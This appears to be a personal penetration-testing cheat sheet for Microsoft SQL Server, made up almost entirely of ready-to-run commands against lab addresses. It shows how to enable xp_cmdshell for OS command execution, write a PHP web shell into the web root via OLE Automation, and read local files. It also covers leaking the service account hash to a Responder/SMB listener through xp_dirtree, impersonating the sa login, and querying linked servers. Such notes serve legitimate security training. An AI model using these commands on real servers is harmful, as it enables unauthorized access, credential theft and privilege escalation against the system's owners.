#MSSQL
Supports 2 [Auth Mechanisms](https://learn.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server?view=sql-server-ver16)

|**Authentication Type**|**Description**|
|---|---|
|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|
|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|

## Connect 

```cmd
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

```shell
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

```shell
mssqlclient.py -p 1433 julio@10.129.203.7 
```
Add -windows-auth or .\\ if local account
## MSSQL default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

## Using MSSQL
show databases 
`SELECT name FROM master.dbo.sysdatabases`
Select DB 
`USE htbusers`
Show Tables
`SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`
Show Entries 
`SELECT * FROM users`

## Execute commands 
```mssql
xp_cmdshell 'whoami'

Go
```

#### Enable xp_cmdshell
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

## Write to Files 
Need to enable [Ole Automation Procedures](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option?view=sql-server-ver16)
```mssql
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
## Create a file 
```mssql
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```
## Read Local files 
```mssql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

## Capturing MSSQL Service hash
#responder
Start [Responder](https://github.com/lgandx/Responder)/ [Impacket-smbserver](https://github.com/fortra/impacket)
```shell
sudo responder -I tun0
```
```shell
sudo impacket-smbserver share ./ -smb2support
```
#### XP_DIRTREE Hash
```mssql
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```

#### XP_SUBDIRS Hash
```mssql
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

## Impersonate Users 
Special permission named Impersonate. 
### Identify users you can impersonate 
```mssql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```
### Verify Current user and role  
```mssql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
### Impersonate a user 
```mssql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
#### Note
It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.

## Communicate with Other Databases 
[Linked servers](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-ver16)

Allow DB engines to execute a Transact-SQL statement. 
Search 
```mssql
1> SELECT srvname, isremote FROM sysservers
2> GO
```
Identify User used for the connection
```mssql
1> [EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]]
2> GO
```
